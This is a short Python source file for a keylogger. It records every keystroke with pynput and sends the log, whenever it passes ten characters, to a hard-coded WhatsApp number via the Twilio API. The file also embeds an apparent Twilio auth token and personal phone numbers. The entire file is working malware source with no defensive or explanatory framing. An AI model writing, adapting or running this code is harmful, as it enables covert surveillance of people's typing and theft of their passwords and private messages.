import smtplib
from pynput.keyboard import Key, Listener
from twilio.rest import Client

# Initialize log and Twilio credentials
log = ""
account_sid = "ACXXXXXXXXXXXXXXXXXX"
auth_token = "69a82365233def1db399f38d06cfee0f"
twilio_number = "whatsapp:+12513697298"
recipient_number = "whatsapp:++916361137467"

# Function to handle key press events
def on_press(key):
    global log
    log += str(key)
    if len(log) > 10:  # Send WhatsApp message after logging 10 characters
        send_log()
        log = ""  # Reset log after sending

# Function to send the log via WhatsApp
def send_log():
    global log
    try:
        client = Client(account_sid, auth_token)
        message = client.messages.create(
            body=log,
            from_=twilio_number,
            to=recipient_number
        )
        print("Log sent successfully via WhatsApp!")
    except Exception as e:
        print(f"Failed to send WhatsApp message: {e}")

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
